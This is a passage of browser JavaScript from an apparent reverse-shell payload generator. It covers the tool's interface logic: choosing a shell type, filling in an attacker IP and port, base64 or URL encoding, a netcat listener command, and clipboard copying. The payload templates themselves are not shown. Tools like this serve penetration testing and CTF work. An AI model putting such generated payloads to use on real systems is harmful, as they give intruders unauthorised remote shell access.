            if (shell && LISTENER_RECOMMENDATIONS[shell.listener]) {
                recommendedId = LISTENER_RECOMMENDATIONS[shell.listener];
            }
        }

        LISTENER_TYPES.forEach(lt => {
            const btn = document.createElement('button');
            const isActive = lt.id === activeListenerType;
            const isRecommended = lt.id === recommendedId;
            let cls = 'listener-type-btn';
            if (isActive) cls += ' active';
            if (isRecommended && !isActive) cls += ' recommended';
            btn.className = cls;
            btn.textContent = lt.name;
            btn.addEventListener('click', () => {
                activeListenerType = lt.id;
                renderListenerTypes();
                updateListenerCommand();
            });
            $listenerTypes.appendChild(btn);
        });
    }

    function getFilteredShells() {
        let filtered = SHELLS;
        if (activeCategory !== 'All') {
            filtered = filtered.filter(s => s.category === activeCategory);
        }
        if (searchQuery) {
            const q = searchQuery.toLowerCase();
            filtered = filtered.filter(s =>
                s.name.toLowerCase().includes(q) ||
                s.category.toLowerCase().includes(q) ||
                s.id.toLowerCase().includes(q)
            );
        }
        return filtered;
    }

    function renderShellList() {
        const filtered = getFilteredShells();
        $shellList.innerHTML = '';

        if (filtered.length === 0) {
            $noResults.classList.remove('hidden');
            $shellList.style.display = 'none';
        } else {
            $noResults.classList.add('hidden');
            $shellList.style.display = '';
        }

        $shellCount.textContent = `${filtered.length} shell${filtered.length !== 1 ? 's' : ''}`;

        filtered.forEach(shell => {
            const item = document.createElement('div');
            item.className = `shell-item${shell.id === activeShell ? ' active' : ''}`;
            item.dataset.id = shell.id;
            item.innerHTML = `
        <span class="shell-item-icon">${shell.icon}</span>
        <div class="shell-item-info">
          <span class="shell-item-name">${highlightMatch(shell.name, searchQuery)}</span>
          <span class="shell-item-category">${shell.category}</span>
        </div>
      `;
            item.addEventListener('click', () => selectShell(shell.id));
            $shellList.appendChild(item);
        });
    }

    function highlightMatch(text, query) {
        if (!query) return text;
        const idx = text.toLowerCase().indexOf(query.toLowerCase());
        if (idx === -1) return text;
        return `${text.slice(0, idx)}<mark style="background:rgba(0,245,160,0.2);color:#00f5a0;border-radius:2px;padding:0 1px">${text.slice(idx, idx + query.length)}</mark>${text.slice(idx + query.length)}`;
    }

    // ── Select Shell ──
    function selectShell(id) {
        activeShell = id;

        // Auto-switch listener to recommended type
        const shell = SHELLS.find(s => s.id === id);
        if (shell && LISTENER_RECOMMENDATIONS[shell.listener]) {
            activeListenerType = LISTENER_RECOMMENDATIONS[shell.listener];
        }

        renderShellList();
        renderListenerTypes();
        generateOutput();
        document.querySelector('.output-panel')?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // ── Generate Output ──
    function generateOutput() {
        const ip = $ip.value.trim() || '10.10.14.5';
        const port = $port.value.trim() || '4444';

        if (!listenerPortManuallyEdited) {
            $listenerPort.value = port;
        }

        if (!activeShell) {
            $shellCode.textContent = '← Select a shell type from above to generate a payload';
            updateListenerCommand();
            $activeShellName.textContent = 'Reverse Shell Command';
            return;
        }

        const shell = SHELLS.find(s => s.id === activeShell);
        if (!shell) return;

        $activeShellName.textContent = `${shell.name} — ${shell.category}`;

        let payload = shell.generate(ip, port);

        if ($doubleQuotes.checked) {
            payload = payload.replace(/'/g, '"');
        }
        if ($base64Encode.checked) {
            try { payload = btoa(payload); }
            catch (e) { payload = btoa(unescape(encodeURIComponent(payload))); }
        }
        if ($urlEncode.checked) {
            payload = encodeURIComponent(payload);
        }

        $shellCode.textContent = payload;
        updateListenerCommand();
    }

    // ── Listener command ──
    function updateListenerCommand() {
        const lIp = $listenerIp.value.trim() || '0.0.0.0';
        const lPort = $listenerPort.value.trim() || '4444';

        const lt = LISTENER_TYPES.find(l => l.id === activeListenerType);
        if (lt) {
            $listenerCode.textContent = lt.generate(lIp, lPort);
            // Toggle IP field visibility based on whether the listener needs it
            if (lt.needsIp) {
                if ($listenerIpGroup) $listenerIpGroup.style.display = 'flex';
            } else {
                if ($listenerIpGroup) $listenerIpGroup.style.display = 'none';
            }
        } else {
            $listenerCode.textContent = `nc -lvnp ${lPort}`;
            if ($listenerIpGroup) $listenerIpGroup.style.display = 'none';
        }
    }

    // ── Copy to Clipboard ──
    function copyToClipboard(text, btn) {
        navigator.clipboard.writeText(text).then(() => {
            flashCopied(btn);
        }).catch(() => {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.cssText = 'position:fixed;left:-9999px';
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            flashCopied(btn);
        });
    }

    function flashCopied(btn) {
        btn.classList.add('copied');
        showToast('Copied to clipboard!');
        setTimeout(() => btn.classList.remove('copied'), 2000);
    }

    // ── Toast ──
    let toastEl = null;
    let toastTimer = null;

    function showToast(message) {
        if (!toastEl) {
            toastEl = document.createElement('div');
            toastEl.className = 'toast';
            document.body.appendChild(toastEl);
        }
        toastEl.textContent = message;
        toastEl.classList.add('show');
        if (toastTimer) clearTimeout(toastTimer);
        toastTimer = setTimeout(() => toastEl.classList.remove('show'), 1800);
    }

    // ══════════════════════════════════════════
    //  EVENT LISTENERS
    // ══════════════════════════════════════════

    $ip.addEventListener('input', generateOutput);
    $port.addEventListener('input', () => { listenerPortManuallyEdited = false; generateOutput(); });
    $urlEncode.addEventListener('change', generateOutput);
    $base64Encode.addEventListener('change', generateOutput);
    $doubleQuotes.addEventListener('change', generateOutput);

    if ($listenerIp) $listenerIp.addEventListener('input', updateListenerCommand);
    if ($listenerPort) $listenerPort.addEventListener('input', () => { listenerPortManuallyEdited = true; updateListenerCommand(); });

    $copyShell.addEventListener('click', () => {
        if ($shellCode.textContent && activeShell) copyToClipboard($shellCode.textContent, $copyShell);
    });

    $copyListener.addEventListener('click', () => {
        copyToClipboard($listenerCode.textContent, $copyListener);
    });

    $shellSearch.addEventListener('input', () => {
        searchQuery = $shellSearch.value.trim();
        $searchClear.classList.toggle('hidden', !searchQuery);
        renderShellList();
    });

    $searchClear.addEventListener('click', () => {
        $shellSearch.value = '';
        searchQuery = '';
        $searchClear.classList.add('hidden');
        $shellSearch.focus();
        renderShellList();
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
            e.preventDefault();
            $shellSearch.focus();
        }
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'C') {
            e.preventDefault();
            if ($shellCode.textContent && activeShell) copyToClipboard($shellCode.textContent, $copyShell);
        }
    });

    $disclaimerClose.addEventListener('click', () => { $disclaimerBanner.classList.add('hidden'); });

    // ══════════════════════════════════════════
    //  INIT
    // ══════════════════════════════════════════
    renderCategoryTabs();
    renderListenerTypes();
    renderShellList();
    generateOutput();
})();
